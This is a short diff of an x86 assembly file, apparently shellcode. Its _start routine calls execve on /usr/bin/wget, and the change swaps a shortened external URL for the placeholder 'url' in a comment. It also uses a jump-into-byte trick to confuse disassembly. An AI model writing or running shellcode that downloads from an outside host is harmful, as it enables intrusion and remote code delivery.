@@ -39,7 +39,7 @@ section .text
 
 _start:
 	; int execve(const char *path, char *const argv[], char *const envp[]);
-	; execve(["/usr/bin/wget", 0], [["/usr/bin/wget", 0], "is.gd/ZLAeEr", 0], 0)
+	; execve(["/usr/bin/wget", 0], [["/usr/bin/wget", 0], "url", 0], 0)
 
 	jmp $+3
 	db 0xe8
